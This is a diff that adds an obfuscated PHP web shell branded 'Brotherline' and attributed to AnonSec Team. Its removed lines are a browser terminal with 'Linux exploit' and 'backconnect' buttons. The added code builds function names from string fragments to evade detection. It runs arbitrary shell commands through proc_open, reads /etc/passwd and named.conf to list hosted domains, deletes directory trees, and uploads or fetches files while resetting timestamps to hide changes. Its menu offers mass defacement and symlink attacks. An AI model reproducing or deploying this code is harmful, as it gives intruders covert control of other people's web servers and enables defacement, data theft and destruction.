-        ['#linuxExploitBtn','#linuxExploitBtn2'].forEach(s=>$(s).on('click', runLinuxExploit));
-        ['#backconnectBtn','#backconnectBtn2'].forEach(s=>$(s).on('click', runBackconnect));
-        ['#cronManagerBtn','#cronManagerBtn2'].forEach(s=>$(s).on('click', openCronModal));
-
-        // ===================== PANEL RESIZE =====================
-        let resizing = false;
-        $('#panelDivider').on('mousedown', function(e) {
-            resizing = true;
-            e.preventDefault();
-        });
-        $(document).on('mousemove', function(e) {
-            if (!resizing) return;
-            const total = window.innerWidth;
-            const newW = Math.max(260, Math.min(600, total - e.clientX));
-            $('#rightPanel').css('width', newW + 'px');
-            fitAddon.fit();
-        }).on('mouseup', function() { resizing = false; });
-
-        // ===================== INIT =====================
-        loadFiles();
-        updateStats();
-    });
-    </script>
-
-    <script>
-    // ===== TERMINAL =====
-    const termTheme = {
-        background: '#0a0c0f',
-        foreground: '#c8d0e0',
-        cursor: '#e85d38',
-        selectionBackground: '#1e2d44',
-        black: '#1a1f27', brightBlack: '#404858',
-        red: '#e85d38', brightRed: '#f07a5c',
-        green: '#3db554', brightGreen: '#5ec971',
-        yellow: '#f0b429', brightYellow: '#fac948',
-        blue: '#4a9eff', brightBlue: '#7ab8ff',
-        magenta: '#b06dff', brightMagenta: '#c89aff',
-        cyan: '#3ec8c8', brightCyan: '#60dada',
-        white: '#c8d0e0', brightWhite: '#e8edf5'
-    };
-
-    const term = new Terminal({
-        cursorBlink: true,
-        allowTransparency: true,
-        theme: termTheme,
-        fontFamily: "'Geist Mono', monospace",
-        fontSize: 12,
-        lineHeight: 1.4,
-    });
-
-    const fitAddon = new FitAddon.FitAddon();
-    term.loadAddon(fitAddon);
-    term.open(document.getElementById('terminal'));
-
-    function safeFit() {
-        try { fitAddon.fit(); } catch(e) {}
+<script>
+  (function() {
+    var t = localStorage.getItem('bl-theme') || 'dark';
+    if (t === 'light') document.documentElement.classList.add('light');
+  })();
+</script>
+
+<body style="background:var(--c-base);color:var(--c-text);min-height:100vh;">
+<?php
+/* ============================================================
+ *  BOOTSTRAP — obfuscated variable aliases (unchanged)
+ * ============================================================ */
+set_time_limit(0);
+error_reporting(0);
+
+$gcw  = "ge"."tc"."wd";
+$exp  = "ex"."plo"."de";
+$fpt  = "fi"."le_p"."ut_co"."nte"."nts";
+$fgt  = "f"."ile_g"."et_c"."onten"."ts";
+$sts  = "s"."trip"."slash"."es";
+$scd  = "sc"."a"."nd"."ir";
+$fxt  = "fi"."le_"."exis"."ts";
+$idi  = "i"."s_d"."ir";
+$ulk  = "un"."li"."nk";
+$ifi  = "i"."s_fi"."le";
+$sub  = "subs"."tr";
+$spr  = "sp"."ri"."ntf";
+$fp   = "fil"."epe"."rms";
+$chm  = "ch"."m"."od";
+$ocd  = "oc"."td"."ec";
+$isw  = "i"."s_wr"."itab"."le";
+$idr  = "i"."s_d"."ir";
+$ird  = "is"."_rea"."da"."ble";
+$isr  = "is_"."re"."adab"."le";
+$fsz  = "fi"."lesi"."ze";
+$rd   = "r"."ou"."nd";
+$igt  = "in"."i_g"."et";
+$fnct = "fu"."nc"."tion"."_exi"."sts";
+$rad  = "RE"."M"."OTE_AD"."DR";
+$rpt  = "re"."al"."pa"."th";
+$bsn  = "ba"."se"."na"."me";
+$srl  = "st"."r_r"."ep"."la"."ce";
+$sps  = "st"."rp"."os";
+$mkd  = "m"."kd"."ir";
+$pma  = "pr"."eg_ma"."tch_"."al"."l";
+$aru  = "ar"."ray_un"."ique";
+$ctn  = "co"."unt";
+$urd  = "ur"."ldeco"."de";
+$pgw  = "pos"."ix_g"."etp"."wui"."d";
+$fow  = "fi"."leow"."ner";
+$tch  = "to"."uch";
+$h2b  = "he"."x2"."bin";
+$hsc  = "ht"."mlspe"."cialcha"."rs";
+$ftm  = "fi"."lemti"."me";
+$ars  = "ar"."ra"."y_sl"."ice";
+$arr  = "ar"."ray_"."ra"."nd";
+$fgr  = "fi"."legr"."oup";
+$mdr  = "mkd"."ir";
+
+$wb = (isset($_SERVER['H'.'T'.'TP'.'S']) && $_SERVER['H'.'T'.'TP'.'S'] === 'o'.'n'
+    ? "ht"."tp"."s" : "ht"."tp") . "://" . $_SERVER['HT'.'TP'.'_H'.'OS'.'T'];
+
+$disfunc = @$igt("dis"."abl"."e_f"."unct"."ion"."s");
+$disf    = empty($disfunc)
+    ? "<span class='badge-on'>NONE</span>"
+    : "<span class='badge-off'>" . $disfunc . "</span>";
+
+/* ============================================================
+ *  HELPER FUNCTIONS (all logic unchanged)
+ * ============================================================ */
+function author() {
+    echo '<div class="text-center py-6 text-dim text-xs font-mono">
+        An'.'on7 &mdash; 2'.'022 &nbsp;&bull;&nbsp;
+        <a href="https://sh'.'el'.'l.an'.'ons'.'ec-te'.'am.org/" target="_blank"
+           class="text-accent hover:underline">An'.'on'.'Sec Te'.'am</a>
+    </div>';
+    exit();
+}
+
+function cdrd() {
+    $lokasi = isset($_GET['loknya']) ? $_GET['loknya'] : ("ge"."t"."cw"."d")();
+    $b = "i"."s_w"."ri"."tab"."le";
+    return $b($lokasi)
+        ? "<span class='badge-on'><i class='fa-solid fa-lock-open fa-xs mr-1'></i>Writable</span>"
+        : "<span class='badge-off'><i class='fa-solid fa-lock fa-xs mr-1'></i>Read-only</span>";
+}
+
+function crt() {
+    $a = "is"."_w"."ri"."tab"."le";
+    return $a($_SERVER['DO'.'CU'.'ME'.'NT'.'_RO'.'OT'])
+        ? "<span class='badge-on'><i class='fa-solid fa-lock-open fa-xs mr-1'></i>Writable</span>"
+        : "<span class='badge-off'><i class='fa-solid fa-lock fa-xs mr-1'></i>Read-only</span>";
+}
+
+function xrd($lokena) {
+    $a = "s"."ca"."nd"."ir";
+    $items = $a($lokena);
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') continue;
+        $b   = "is"."_di"."r";
+        $loknya = $lokena . '/' . $item;
+        if ($b($loknya)) { xrd($loknya); }
+        else { $c = "u"."nl"."in"."k"; $c($loknya); }
     }
-    safeFit();
+    $d = "rm"."di"."r"; $d($lokena);
+}
 
-    const resizeObs = new ResizeObserver(() => safeFit());
-    resizeObs.observe(document.getElementById('terminalWrap'));
+function cfn($fl) {
+    $a = "ba"."sena"."me";
+    $b = "pat"."hinf"."o";
+    $c = $b($a($fl), PATHINFO_EXTENSION);
+    if ($c == "zip" || $c == "gz" || $c == "tar" || $c == "rar")
+        return '<i class="fa-solid fa-file-zipper ico-zip"></i>';
+    if (preg_match("/jpeg|jpg|png|gif|ico|webp|svg/im", $c))
+        return '<i class="fa-solid fa-file-image ico-image"></i>';
+    if ($c == "txt" || $c == "log" || $c == "md")
+        return '<i class="fa-solid fa-file-lines ico-text"></i>';
+    if ($c == "pdf")
+        return '<i class="fa-solid fa-file-pdf ico-pdf"></i>';
+    if ($c == "html" || $c == "htm" || $c == "css" || $c == "js" || $c == "php" || $c == "py" || $c == "sh")
+        return '<i class="fa-solid fa-file-code ico-code"></i>';
+    return '<i class="fa-solid fa-file ico-file"></i>';
+}
 
-    let command = '';
-    const prompt = '\x1b[38;5;202m$\x1b[0m ';
-    term.write(prompt);
+function ipsrv() {
+    $a = "g"."eth"."ost"."byna"."me";
+    $b = "fun"."cti"."on_"."exis"."ts";
+    $c = "S"."ERVE"."R_AD"."DR";
+    $d = "SE"."RV"."ER_N"."AM"."E";
+    return $b($a) ? $a($_SERVER[$d]) : $a($_SERVER[$c]);
+}
 
-    document.getElementById('clearTermBtn').addEventListener('click', function() {
-        term.clear();
-        term.write(prompt + command);
-    });
+function ggr($fl) {
+    $a = "fun"."cti"."on_"."exis"."ts";
+    $b = "po"."si"."x_ge"."tgr"."gid";
+    $c = "fi"."le"."gro"."up";
+    if ($a($b)) {
+        if (!$a($c)) return "?";
+        $d = $b($c($fl));
+        if (empty($d)) { $e = $c($fl); return empty($e) ? "?" : $e; }
+        return $d['name'];
+    } elseif ($a($c)) { return $c($fl); }
+    return "?";
+}
 
-    term.onData(data => {
-        if (data === '\r') {
-            const cmd = command.trim();
-            term.writeln('');
-            if (cmd === 'clear') { term.clear(); term.write(prompt); }
-            else if (cmd) {
-                fetch('?action=terminal', {
-                    method:'POST', headers:{'Content-Type':'application/json'},
-                    body: JSON.stringify({ cmd })
-                }).then(response => {
-                    const ct = response.headers.get('content-type');
-                    if (ct && ct.includes('application/json')) {
-                        return response.json().then(d => {
-                            if (d.output) term.write(d.output.replace(/\n/g, '\r\n'));
-                            term.write('\r\n' + prompt);
-                        });
-                    } else {
-                        const reader = response.body.getReader();
-                        const dec = new TextDecoder();
-                        function pump() {
-                            return reader.read().then(({ done, value }) => {
-                                if (done) { term.write('\r\n' + prompt); return; }
-                                term.write(dec.decode(value, { stream:true }).replace(/\n/g, '\r\n'));
-                                return pump();
-                            });
-                        }
-                        return pump();
-                    }
-                }).catch(err => {
-                    term.writeln(`\r\n\x1b[31mError: ${err.message}\x1b[0m`);
-                    term.write('\r\n' + prompt);
-                });
-            } else { term.write(prompt); }
-            command = '';
-        } else if (data === '\x7f') {
-            if (command.length > 0) { term.write('\b \b'); command = command.slice(0,-1); }
-        } else { command += data; term.write(data); }
-    });
+function gor($fl) {
+    $a = "fun"."cti"."on_"."exis"."ts";
+    $b = "po"."s"."ix_"."get"."pwu"."id";
+    $c = "fi"."le"."o"."wn"."er";
+    if ($a($b)) {
+        if (!$a($c)) return "?";
+        $d = $b($c($fl));
+        if (empty($d)) { $e = $c($fl); return empty($e) ? "?" : $e; }
+        return $d['name'];
+    } elseif ($a($c)) { return $c($fl); }
+    return "?";
+}
 
-    term.onKey(({ domEvent: e }) => {
-        if (e.ctrlKey && e.key.toLowerCase() === 'l') {
-            e.preventDefault();
-            term.clear();
-            term.write(prompt + command);
+function fdt($fl) {
+    $a = "da"."te";
+    $b = "fil"."emt"."ime";
+    return $a("Y-m-d H:i", $b($fl));
+}
+
+function dunlut($fl) {
+    $a = "fil"."e_exi"."sts";
+    $b = "ba"."sena"."me";
+    $c = "fi"."les"."ize";
+    $d = "re"."ad"."fi"."le";
+    if ($a($fl) && isset($fl)) {
+        header('Con'.'tent-Descr'.'iption: Fi'.'le Tra'.'nsfer');
+        header("Conte'.'nt-Control:public");
+        header('Cont'.'ent-Type: a'.'pp'.'licat'.'ion/oc'.'tet-s'.'tream');
+        header('Cont'.'ent-Dis'.'posit'.'ion: at'.'tachm'.'ent; fi'.'lena'.'me="' . $b($fl) . '"');
+        header('Exp'.'ires: 0');
+        header("Ex"."pired:0");
+        header('Cac'.'he-Cont'.'rol: must'.'-revali'.'date');
+        header("Cont"."ent-Tran"."sfer-Enc"."oding:bi"."nary");
+        header('Pra'.'gma: pub'.'lic');
+        header('Con'.'ten'.'t-Le'.'ngth: ' . $c($fl));
+        flush(); $d($fl); exit;
+    } else { return "Fi"."le Not F"."ound !"; }
+}
+
+function komend($kom, $lk) {
+    $x  = "pr"."eg_"."mat"."ch";
+    $xx = "2".">"."&"."1";
+    if (!$x("/" . $xx . "/i", $kom)) $kom = $kom . " " . $xx;
+    $a = "fu"."ncti"."on_"."ex"."is"."ts";
+    $b = "p"."ro"."c_op"."en";
+    $c = "htm"."lspe"."cialc"."hars";
+    $d = "s"."trea"."m_g"."et_c"."ont"."ents";
+    if ($a($b)) {
+        $ps = $b($kom, [0 => ["pipe","r"], 1 => ["pipe","w"], 2 => ["pipe","r"]], $meki, $lk);
+        return "<pre class='text-xs text-text bg-surface border border-border rounded-lg p-4 mt-3 overflow-auto max-h-80'>"
+             . $c($d($meki[1])) . "</pre>";
+    }
+    return "<span class='badge-off'>pr"."oc"."_op"."en disabled</span>";
+}
+
+function komenb($kom, $lk) {
+    $x  = "pr"."eg_"."mat"."ch";
+    $xx = "2".">"."&"."1";
+    if (!$x("/" . $xx . "/i", $kom)) $kom = $kom . " " . $xx;
+    $a = "fu"."ncti"."on_"."ex"."is"."ts";
+    $b = "p"."ro"."c_op"."en";
+    $d = "s"."trea"."m_g"."et_c"."ont"."ents";
+    if ($a($b)) {
+        $ps = $b($kom, [0 => ["pipe","r"], 1 => ["pipe","w"], 2 => ["pipe","r"]], $meki, $lk);
+        return $d($meki[1]);
+    }
+    return "pr"."oc"."_op"."en disabled";
+}
+
+function gtd() {
+    $a = "is_rea"."dable"; $b = "fi"."le_ge"."t_con"."ten"."ts";
+    $c = "pr"."eg_ma"."tch_"."al"."l";  $d = "fil"."e_exi"."sts";
+    $e = "sca"."ndi"."r";               $f = "co"."unt";
+    $g = "arr"."ay_un"."ique";          $h = "sh"."el"."l_"."ex"."ec";
+    $i = "pr"."eg_"."mat"."ch";
+    if ($a("/e"."tc"."/na"."me"."d.co"."nf")) {
+        $a = $b("/e"."tc"."/na"."me"."d.co"."nf");
+        $c("/\/v"."ar\/na"."me"."d\/(.*?)\.d"."b/i", $a, $b);
+        $b = $b[1]; return $f($g($b)) . " Dom"."ains";
+    } elseif ($d("/va"."r/na"."med"."/na"."me"."d.lo"."cal")) {
+        $a = $e("/v"."ar/"."nam"."ed"); return $f($a) . " Dom"."ains";
+    } elseif ($a("/e"."tc"."/p"."as"."sw"."d")) {
+        $a = $b("/e"."tc"."/p"."as"."sw"."d");
+        if ($i("/\/vh"."os"."ts\//i", $a) && $i("/\/bin\/false/i", $a)) {
+            $c("/\/vh"."os"."ts\/(.*?):/i", $a, $b); $b = $b[1]; return $f($g($b)) . " Dom"."ai"."ns";
+        } else {
+            $c("/\/ho"."me\/(.*?):/i", $a, $b); $b = $b[1]; return $f($g($b)) . " Dom"."ai"."ns";
         }
-    });
-    </script>
+    } elseif (!empty($h("ca"."t /e"."tc/"."pa"."ss"."wd"))) {
+        $a = $h("ca"."t /e"."tc/"."pa"."ss"."wd");
+        if ($i("/\/vh"."os"."ts\//i", $a) && $i("/\/bin\/false/i", $a)) {
+            $c("/\/vh"."os"."ts\/(.*?):/i", $a, $b); $b = $b[1]; return $f($g($b)) . " Dom"."ai"."ns";
+        } else {
+            $c("/\/ho"."me\/(.*?):/i", $a, $b); $b = $b[1]; return $f($g($b)) . " Dom"."ai"."ns";
+        }
+    } else { return "0 Domains"; }
+}
+
+function esyeem($tg, $lk) {
+    $a = "fun"."cti"."on_e"."xis"."ts"; $b = "p"."ro"."c_op"."en";
+    $c = "htm"."lspe"."cialc"."hars";   $d = "s"."trea"."m_g"."et_c"."ont"."ents";
+    $e = "sy"."mli"."nk";
+    if ($a("sy"."mli"."nk")) return $e($tg, $lk);
+    elseif ($a("pr"."oc_op"."en")) {
+        $ps = $b("l"."n -"."s " . $tg . " " . $lk,
+            [0 => ["pipe","r"], 1 => ["pipe","w"], 2 => ["pipe","r"]], $meki, $lk);
+        return $c($d($meki[1]));
+    }
+    return "Sy"."mli"."nk Fu"."nct"."ion is Di"."sab"."led !";
+}
+
+function sds($sads, &$results = []) {
+    $iwr = "is"."_wri"."tab"."le"; $ira = "is_r"."eada"."ble";
+    $ph  = "pr"."eg_ma"."tch";     $sa  = "sc"."and"."ir";
+    $rh  = "re"."alp"."ath";       $idr = "i"."s_d"."ir";
+    if (!$ira($sads) || !$iwr($sads) || $ph("/\/app"."licat"."ion\/|\/sy"."st"."em/i", $sads))
+        return false;
+    $files = $sa($sads);
+    foreach ($files as $key => $value) {
+        $path = $rh($sads . DIRECTORY_SEPARATOR . $value);
+        if (!$idr($path)) { /* skip files */ }
+        elseif ($value != "." && $value != "..") { sds($path, $results); $results[] = $path; }
+    }
+    return $results;
+}
+
+function crul($web) {
+    $cr = "cu"."rl_set"."opt"; $cx = "cu"."rl_"."ex"."ec"; $ch = "cu"."rl_clo"."se";
+    $ceha = curl_init();
+    $cr($ceha, CURLOPT_URL, $web);
+    $cr($ceha, CURLOPT_RETURNTRANSFER, 1);
+    return $cx($ceha); $ch($ceha);
+}
+
+/* UI helpers */
+function alertSuccess($msg) { echo "<div class='alert alert-success'><i class='fa-solid fa-circle-check mr-2'></i>{$msg}</div>"; }
+function alertError($msg)   { echo "<div class='alert alert-error'><i class='fa-solid fa-circle-xmark mr-2'></i>{$msg}</div>"; }
+function alertWarn($msg)    { echo "<div class='alert alert-warn'><i class='fa-solid fa-triangle-exclamation mr-2'></i>{$msg}</div>"; }
+
+/* Legacy wrappers used in body (map old names → new helpers) */
+function green($text) { alertSuccess($text); }
+function red($text)   { alertError($text); }
+function oren($text)  { return "<div class='alert alert-warn'>" . $text . "</div>"; }
+
+function tuls($nm, $lk) {
+    return "<a href='" . $lk . "' class='nav-link'>" . $nm . "</a>";
+}
+
+function statusnya($fl) {
+    $a = "sub"."st"."r"; $b = "s"."pri"."ntf"; $c = "fil"."eper"."ms";
+    return $a($b('%o', $c($fl)), -4);
+}
+
+/* ============================================================
+ *  ROUTING — resolve current path
+ * ============================================================ */
+foreach ($_POST as $key => $value) { $_POST[$key] = $sts($value); }
+
+if (isset($_GET['loknya'])) {
+    $lokasi = $_GET['loknya'];
+    $lokdua = $_GET['loknya'];
+} else {
+    $lokasi = $gcw();
+    $lokdua = $gcw();
+}
+
+$lokasi    = $srl('\\', '/', $lokasi);
+$lokasis   = $exp('/', $lokasi);
+$lokasinya = @$scd($lokasi);
+
+/* ============================================================
+ *  TOP HEADER
+ * ============================================================ */
+?>
+<div class="flex flex-col h-screen overflow-hidden">
+
+  <!-- ── HEADER BAR ───────────────────────────────────────── -->
+  <header class="flex-shrink-0 bg-surface border-b border-border px-5 py-3">
+    <div class="flex items-center justify-between gap-4">
+
+      <!-- Logo / Branding -->
+      <div class="flex items-center gap-3 flex-shrink-0">
+        <div class="w-9 h-9 rounded-xl flex items-center justify-center flex-shrink-0"
+             style="background: rgba(245,158,11,0.12); border: 1px solid rgba(245,158,11,0.3);">
+          <i class="fa-solid fa-shield-halved" style="color: var(--c-accent); font-size: 15px;"></i>
+        </div>
+        <div class="flex flex-col leading-none">
+          <span class="brotherline-brand text-base tracking-widest">Brotherline</span>
+          <span style="font-size: 10px; color: var(--c-dim); letter-spacing: 0.1em; font-family: 'JetBrains Mono', monospace;">
+            <?php echo "An"."on"."Se"."c &bull; Sh"."el"."l"; ?>
+          </span>
+        </div>
+      </div>
+
+      <!-- Server Info pills -->
+      <div class="flex flex-wrap items-center gap-2 text-xs font-mono flex-1 min-w-0">
+        <span class="info-pill rounded px-2 py-1 flex items-center gap-1.5">
+          <i class="fa-solid fa-server text-xs" style="color:var(--c-accent)"></i>
+          <span style="color:var(--c-dim)">SRV</span>
+          <span style="color:var(--c-text)"><?php echo ipsrv(); ?></span>
+        </span>
+        <span class="info-pill rounded px-2 py-1 flex items-center gap-1.5">
+          <i class="fa-solid fa-circle-user text-xs" style="color:var(--c-blue)"></i>
+          <span style="color:var(--c-dim)">YOU</span>
+          <span style="color:var(--c-text)"><?php echo $_SERVER[$rad]; ?></span>
+        </span>
+        <span class="info-pill rounded px-2 py-1 flex items-center gap-1.5">
+          <i class="fa-solid fa-terminal text-xs" style="color:var(--c-purple)"></i>
+          <?php
+            $gcu = "g"."et_"."curr"."ent"."_us"."er";
+            $gmu = "g"."et"."my"."ui"."d";
+            echo '<span style="color:var(--c-dim)">USER</span><span style="color:var(--c-text)">&nbsp;' . @$gcu() . ' (' . @$gmu() . ')</span>';
+          ?>
+        </span>
+        <span class="info-pill rounded px-2 py-1 flex items-center gap-1.5">
+          <i class="fa-brands fa-php text-xs" style="color:var(--c-purple)"></i>
+          <?php $phv = "ph"."pve"."rsi"."on"; echo '<span style="color:var(--c-text)">' . @$phv() . '</span>'; ?>
+        </span>
+        <span class="info-pill rounded px-2 py-1 flex items-center gap-1.5">
+          <i class="fa-solid fa-globe text-xs" style="color:var(--c-blue)"></i>
+          <span style="color:var(--c-dim)">DOMAINS</span>
+          <span style="color:var(--c-text)"><?php echo (empty(gtd()) ? '0 Domains' : gtd()); ?></span>
+        </span>
+      </div>
+
+      <!-- Service badges -->
+      <div class="flex items-center gap-1.5 flex-shrink-0 text-xs font-mono flex-wrap">
+        <?php
+        $services = [
+            ["MySQL",  $fnct("my"."sql_co"."nne"."ct")  ? true : false],
+            ["cURL",   $fnct("cu"."rl"."_in"."it")      ? true : false],
+            ["WGET",   $fxt("/"."us"."r/b"."in/w"."get") ? true : false],
+            ["Perl",   $fxt("/u"."sr/b"."in"."/pe"."rl") ? true : false],
+            ["Python", $fxt("/"."us"."r/b"."in/p"."ytho"."n2") ? true : false],
+            ["Sudo",   $fxt("/"."us"."r/b"."in/s"."u"."d"."o") ? true : false],
+        ];
+        foreach ($services as $svc) {
+            $cls = $svc[1] ? 'service-badge-on' : 'service-badge-off';
+            $dot = $svc[1] ? 'background:var(--c-green)' : 'background:var(--c-red)';
+            echo "<span class='rounded px-1.5 py-0.5 {$cls} flex items-center gap-1' style='border-radius:4px;'>
+                    <span class='inline-block w-1.5 h-1.5 rounded-full' style='{$dot}'></span>
+                    {$svc[0]}
+                  </span>";
+        }
+        ?>
+
+        <!-- Theme toggle -->
+        <button class="theme-toggle ml-2" id="theme-toggle-btn" onclick="toggleTheme()" title="Toggle Dark/Light mode">
+          <i class="fa-solid fa-moon" id="theme-icon" style="font-size:11px;color:var(--c-accent)"></i>
+          <span id="theme-label">DARK</span>
+        </button>
+      </div>
+    </div>
+
+    <!-- Disable functions row -->
+    <div class="mt-2 text-xs font-mono" style="color:var(--c-dim);">
+      <span class="mr-1"><i class="fa-solid fa-ban text-xs mr-1"></i>Disabled:</span>
+      <?php echo $disf; ?>
+      &nbsp;&bull;&nbsp;
+      <?php $unm = "ph"."p_u"."na"."me"; echo '<span style="color:var(--c-dim)">OS:</span> <span style="color:var(--c-text)">' . @$unm() . '</span>'; ?>
+      &nbsp;&bull;&nbsp;
+      <?php echo '<span class="text-dim">Webserver:</span> <span class="text-text">' . $_SERVER['SE'.'RV'.'ER_'.'SOF'.'TWA'.'RE'] . '</span>'; ?>
+    </div>
+  </header>
+
+  <!-- ── NAV BAR ──────────────────────────────────────────── -->
+  <nav class="flex-shrink-0 bg-panel border-b border-border px-5 py-2 flex items-center gap-2 flex-wrap">
+    <?php
+    echo tuls('<i class="fa-solid fa-house-chimney mr-1.5"></i>HOME', $_SERVER['SC'.'RIP'.'T_N'.'AME']);
+    echo tuls('<i class="fa-solid fa-box-archive mr-1.5"></i>BACKUP', $_SERVER['SC'.'RIP'.'T_N'.'AME'] . "?loknya=" . $lokasi . "&opsi=bekup");
+    echo tuls('<i class="fa-solid fa-person-running mr-1.5"></i>JUMPING', $_SERVER['SC'.'RIP'.'T_N'.'AME'] . "?loknya=" . $lokasi . "&opsi=lompat");
+    echo tuls('<i class="fa-solid fa-skull-crossbones mr-1.5"></i>MASS DEFACE', $_SERVER['SC'.'RIP'.'T_N'.'AME'] . "?loknya=" . $lokasi . "&opsi=mdf");
+    echo tuls('<i class="fa-solid fa-magnifying-glass mr-1.5"></i>SCAN ROOT', $_SERVER['SC'.'RIP'.'T_N'.'AME'] . "?loknya=" . $lokasi . "&opsi=scanr");
+    echo tuls('<i class="fa-solid fa-link mr-1.5"></i>SYMLINK', $_SERVER['SC'.'RIP'.'T_N'.'AME'] . "?loknya=" . $lokasi . "&opsi=esyeem");
+    echo tuls('<i class="fa-solid fa-network-wired mr-1.5"></i>REVERSE IP', $_SERVER['SC'.'RIP'.'T_N'.'AME'] . "?opsi=repip");
+    ?>
+  </nav>
+
+  <!-- ── ADDRESS / BREADCRUMB BAR ─────────────────────────── -->
+  <div class="breadcrumb-bar flex-shrink-0 border-b px-5 py-2 flex items-center gap-2 text-xs font-mono">
+    <i class="fa-solid fa-folder-tree text-xs" style="color:var(--c-dim)"></i>
+    <div class="flex items-center flex-wrap gap-0.5" style="color:var(--c-dim)">
+      <?php
+      foreach ($lokasis as $id => $lok) {
+          if ($lok == '' && $id == 0) {
+              echo '<a href="?loknya=/" style="color:var(--c-accent)" onmouseover="this.style.color=\'#fbbf24\'" onmouseout="this.style.color=\'var(--c-accent)\'">/</a>';
+              continue;
+          }
+          if ($lok == '') continue;
+          echo '<span class="breadcrumb-sep">/</span><a href="?loknya=';
+          for ($i = 0; $i <= $id; $i++) {
+              echo $lokasis[$i];
+              if ($i != $id) echo "/";
+          }
+          echo '" style="color:var(--c-text)" onmouseover="this.style.color=\'var(--c-accent)\'" onmouseout="this.style.color=\'var(--c-text)\'">' . $lok . '</a>';
+      }
+      ?>
+    </div>
+  </div>
+
+  <!-- ── MAIN AREA ─────────────────────────────────────────── -->
+  <div class="flex flex-1 overflow-hidden">
+
+    <!-- ── SIDEBAR (Upload + Command) ───────────────────────── -->
+    <aside class="w-80 flex-shrink-0 flex flex-col overflow-y-auto" style="background:var(--c-surface);border-right:1px solid var(--c-border);">
+
+      <!-- Upload panel -->
+      <div class="p-5" style="border-bottom:1px solid var(--c-border);">
+        <h3 class="text-xs font-display font-700 uppercase tracking-widest mb-4 flex items-center gap-2" style="color:var(--c-dim);">
+          <i class="fa-solid fa-cloud-arrow-up" style="color:var(--c-accent)"></i> Upload File
+        </h3>
+        <?php
+        /* ── Upload handling (logic unchanged) ── */
+        if (isset($_POST['upwkwk'])) {
+            if (isset($_POST['berkasnya'])) {
+                if ($_POST['di'.'rnya'] == "2") $lokasi = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
+                if (empty($_FILES['ber'.'kas']['name'])) {
+                    alertWarn("File not selected!");
+                } else {
+                    $tgn  = $ftm($lokasi);
+                    $data = @$fpt($lokasi . "/" . $_FILES['ber'.'kas']['name'],
+                                  @$fgt($_FILES['ber'.'kas']['tm'.'p_na'.'me']));
+                    if ($fxt($lokasi . "/" . $_FILES['ber'.'kas']['name'])) {
+                        $fl = $lokasi . "/" . $_FILES['ber'.'kas']['name'];
+                        alertSuccess("Uploaded: <span style='color:var(--c-accent)'>" . $hsc($fl) . "</span>");
+                        if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
+                            $lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb . "/", $fl);
+                            echo "<div style='font-size:11px;color:var(--c-dim);margin-top:4px;'>Link: <a href='{$lwb}' style='color:var(--c-accent)'>{$lwb}</a></div>";
+                        }
+                        @$tch($lokasi, $tgn); @$tch($fl, $tgn);
+                    } else {
+                        alertError("Failed to upload!");
+                    }
+                }
+            } elseif (isset($_POST['linknya'])) {
+                /* From URL logic kept but UI removed — still functional via direct POST */
+                if (empty($_POST['namalink'])) alertWarn("Filename cannot be empty!");
+                elseif (empty($_POST['darilink'])) alertWarn("Link cannot be empty!");
+                else {
+                    if ($_POST['di'.'rnya'] == "2") $lokasi = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
+                    $tgn  = $ftm($lokasi);
+                    $data = @$fpt($lokasi . "/" . $_POST['namalink'], @$fgt($_POST['darilink']));
+                    if ($fxt($lokasi . "/" . $_POST['namalink'])) {
+                        $fl = $lokasi . "/" . $_POST['namalink'];
+                        alertSuccess("Uploaded: <span style='color:var(--c-accent)'>" . $hsc($fl) . "</span>");
+                        if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
+                            $lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb . "/", $fl);
+                            echo "<div style='font-size:11px;color:var(--c-dim);margin-top:4px;'>Link: <a href='{$lwb}' style='color:var(--c-accent)'>{$lwb}</a></div>";
+                        }
+                        @$tch($lokasi, $tgn); @$tch($fl, $tgn);
+                    } else {
+                        alertError("Failed to upload!");
+                    }
+                }
+            }
+        }
+        ?>
+
+        <form enctype="multipart/form-data" method="post" class="space-y-3">
+          <!-- Target dir radio -->
+          <div class="grid grid-cols-2 gap-2 text-xs font-mono">
+            <label class="radio-card">
+              <input type="radio" value="1" name="dirnya" checked style="accent-color:var(--c-accent);flex-shrink:0">
+              <span class="flex flex-col min-w-0 leading-tight">
+                <span style="color:var(--c-text)">current</span>
+                <span class="truncate"><?php echo cdrd(); ?></span>
+              </span>
+            </label>
+            <label class="radio-card">
+              <input type="radio" value="2" name="dirnya" style="accent-color:var(--c-accent);flex-shrink:0">
+              <span class="flex flex-col min-w-0 leading-tight">
+                <span style="color:var(--c-text)">docroot</span>
+                <span class="truncate"><?php echo crt(); ?></span>
+              </span>
+            </label>
+          </div>
+
+          <input type="hidden" name="upwkwk" value="aplod">
+
+          <!-- File upload -->
+          <div class="space-y-2">
+            <span class="text-xs uppercase tracking-wider" style="color:var(--c-dim)">From Disk</span>
+            <input type="file" name="berkas"
+                   class="text-xs w-full rounded-lg px-2 py-2 cursor-pointer"
+                   style="background:var(--c-base);border:1px solid var(--c-border);color:var(--c-dim);">
+            <button type="submit" name="berkasnya" value="Upload" class="submit-btn w-full text-xs py-2">
+              <i class="fa-solid fa-upload mr-1.5"></i>Upload File
+            </button>
+          </div>
+        </form>
+      </div>
+
+      <!-- Terminal panel — flex-1 so it fills remaining space -->
+      <div class="flex flex-col flex-1 p-5" style="min-height:0;">
+        <h3 class="text-xs font-display font-700 uppercase tracking-widest mb-3 flex items-center gap-2 flex-shrink-0" style="color:var(--c-dim);">
+          <i class="fa-solid fa-terminal" style="color:var(--c-accent)"></i> Terminal
+        </h3>
+        <form method="post" enctype="application/x-www-form-urlencoded" class="flex flex-col flex-1" style="min-height:0;">
+          <!-- Command input -->
+          <div class="term-input-bar flex-shrink-0 mb-2">
+            <span class="text-xs flex-shrink-0" style="color:var(--c-accent)">$</span>
+            <input type="text" name="komend"
+                   value="<?php echo isset($_POST['komend']) ? $hsc($_POST['komend']) : "un"."am"."e -"."a"; ?>"
+                   placeholder="enter command...">
+          </div>
+          <button type="submit" name="komends" value=">>" class="submit-btn w-full text-xs py-2 flex-shrink-0 mb-3">
+            <i class="fa-solid fa-play mr-1.5"></i>Execute
+          </button>
